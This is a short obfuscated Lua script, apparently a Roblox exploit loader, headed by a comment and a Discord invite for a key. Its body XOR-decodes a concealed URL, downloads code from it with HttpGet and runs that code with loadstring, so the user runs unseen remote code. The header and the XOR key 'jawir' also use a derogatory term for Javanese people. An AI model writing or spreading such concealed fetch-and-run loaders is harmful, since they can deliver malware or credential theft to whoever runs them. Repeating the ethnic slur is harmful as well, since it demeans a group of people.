--[[ Protected by Magical from Javanese people
Join for key https://discord.gg/gfqDhjMjtM]]

( function (...) local _lIlllIlIII = "\002\021\003\025\001\080\078\088\027\019\029\079\016\000\006\002\020\021\028\001\015\019\020\006\028\030\004\025\029\092\009\014\026\070\060\011\021\003\008\030\016\078\005\011\030\018\078\005\012\020\025\078\031\012\019\014\018\088\004\019\003\015\088\045\000\011\008\025\061\026\015\045\022\002\023\068\013\002\008" local _IllllIlIll = "jawir" local function _IlllllIIlI(str, k) local _IIlllIlIlI = {} for i = 0x1, #str do local _lIIllIIIII = string.byte(str, i) local _IIIIIIIllI = string.byte(k, ((i - 0x1) % #k) + 0x1) table.insert(_IIlllIlIlI, string.char(bit32.bxor(_lIIllIIIII, _IIIIIIIllI))) end
 return table.concat(_IIlllIlIlI) end
 local _IllIIIlIIl = _IlllllIIlI(_lIlllIlIII, _IllllIlIll) if not _IllIIIlIIl:match("^https://") then return end
 local _IlllIIllIl = game:HttpGet(_IllIIIlIIl) loadstring(_IlllIIllIl)() end
 )(...)
